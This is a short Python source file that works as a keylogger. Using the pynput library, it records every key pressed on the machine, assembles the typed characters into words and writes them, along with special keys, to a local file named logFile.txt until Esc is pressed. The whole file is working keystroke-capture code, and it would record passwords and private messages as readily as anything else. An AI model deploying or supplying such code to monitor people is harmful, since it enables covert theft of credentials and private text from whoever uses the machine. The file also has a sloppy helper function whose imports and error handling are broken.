from pynput.keyboard import Listener , Key
import logging
from sys import stdin,stdout
import termios
import msvcrt

LOGGING_FORMAT = '%(message)s'
word = ''


def flush_input():  ## from https://rosettacode.org/wiki/Keyboard_input/Flush_the_keyboard_buffer   # only for windows
    try:
        while msvcrt.kbhit():
            msvcrt.getch()
    except ImportError:
        termios.tcflush(sys.stdin, termios.TCIOFLUSH)

def on_press(key):
    global word
    global logger
    '''keys = [ Key.alt, Key.alt_gr , Key.alt_l , Key.alt_r ,Key.backspace,
            Key.cmd, Key.cmd_l , Key.cmd_r ,Key.caps_lock,
            Key.ctrl , Key.ctrl_r , Key.ctrl_l , Key.delete ,Key.down , Key.end ,
            Key.left, Key.right, Key.up , Key.home , Key.insert , Key.menu ,
            Key.num_lock , Key.page_down , Key.page_up ,Key.pause , Key.print_screen ,
            Key.scroll_lock , Key.shift , Key.shift_l , Key.shift_r , Key.enter]                 # all non literal keys.
    '''
    #if key in keys:
        #logger.info(key)
    if key == Key.esc:
        #flush_input()    # works only on windows
        return False
    elif key == Key.space or key == Key.tab:
        logger.info(word)
        word = ''   # clear it for next the word.
    else:
        keyPress = str(key)
        check = True
        if keyPress[0] == 'u':           # check if the key press stored as a binary. eg: 'a' --> u'a'
            keyPress = keyPress[1:].replace('\'','')
            word = word + keyPress   # create a word from keypresses.
            check = False
        elif '\'' in keyPress and check:   # a character key press , string format ( not binary ) eg: 'a' --> 'a'
            keyPress = keyPress.replace('\'','')
            word = word + keyPress   # create a word from keypresses.
        else:  # non character key press , juste like elements in the 'keys' list above eg: Key.space / Key.alt.
            logger.info(key)


logging.basicConfig(filename = 'logFile.txt',level = logging.DEBUG,format = LOGGING_FORMAT)
logger = logging.getLogger()


with Listener(on_press=on_press) as listener:
    listener.join()
